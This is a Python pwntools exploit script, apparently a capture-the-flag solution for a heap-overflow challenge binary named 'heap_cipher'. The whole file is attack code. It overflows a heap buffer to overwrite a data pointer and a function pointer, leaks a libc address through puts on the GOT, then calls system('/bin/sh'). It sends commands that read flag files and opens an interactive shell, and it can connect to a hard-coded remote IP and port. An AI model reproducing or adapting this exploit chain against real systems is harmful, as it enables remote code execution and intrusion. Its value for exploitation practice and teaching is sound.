#!/usr/bin/env python3
from pwn import *

context.arch = 'amd64'
context.log_level = 'info'

exe = ELF('./heap_cipher', checksec=False)
libc = ELF('./libc.so.6', checksec=False)

PUTS_PLT = exe.plt['puts']          # 0x401040
GOT_PUTS = exe.got['puts']          # 0x404008

# Offsets within libc 2.41
OFF_PUTS   = libc.symbols['puts']
OFF_SYSTEM = libc.symbols['system']
OFF_BINSH  = next(libc.search(b'/bin/sh\x00'))

# Overflow buffer starts at local_10. local_18 struct is +0x50.
#   +0x50 : key/rounds (struct[0..7])
#   +0x58 : data ptr   (arg1 to func)
#   +0x60 : length     (overwritten by program with bytes-read)
#   +0x68 : func ptr   (called as func(arg1, len))
def build(arg1, func):
    p  = b'A' * 0x40          # message (first 0x40 get encrypted, irrelevant)
    p += b'B' * 8             # prev_size padding of next chunk
    p += p64(0x31)            # chunk B size (keep valid so free() survives)
    p += p64(0)               # struct[0..7] key/rounds
    p += p64(arg1)            # +0x58 data ptr -> arg1
    p += p64(0)               # +0x60 length (clobbered)
    p += p64(func)            # +0x68 func ptr
    assert len(p) == 0x70
    return p

def one_round(io, payload):
    io.recvuntil(b'Enter message length: ')
    io.sendline(str(len(payload)).encode())
    io.recvuntil(b'bytes): ')
    io.send(payload)

def exploit(io):
    # Round 1: leak libc via puts(got.puts)
    one_round(io, build(GOT_PUTS, PUTS_PLT))
    leak = io.recvline().strip()
    leak = u64(leak.ljust(8, b'\x00'))
    log.success('puts leak: %#x', leak)
    libc_base = leak - OFF_PUTS
    assert libc_base & 0xfff == 0, 'bad leak / alignment: %#x' % libc_base
    log.success('libc base: %#x', libc_base)

    system = libc_base + OFF_SYSTEM
    binsh  = libc_base + OFF_BINSH
    log.info('system=%#x binsh=%#x', system, binsh)

    # Round 2: system("/bin/sh")
    one_round(io, build(binsh, system))
    io.recvuntil(b'bytes): ')
    io.sendline(b'id; cat flag* 2>/dev/null; cat /flag* 2>/dev/null; ls -la')
    io.interactive()

if __name__ == '__main__':
    if args.REMOTE:
        io = remote('141.85.224.104', 43337)
    else:
        io = process([exe.path])
    exploit(io)
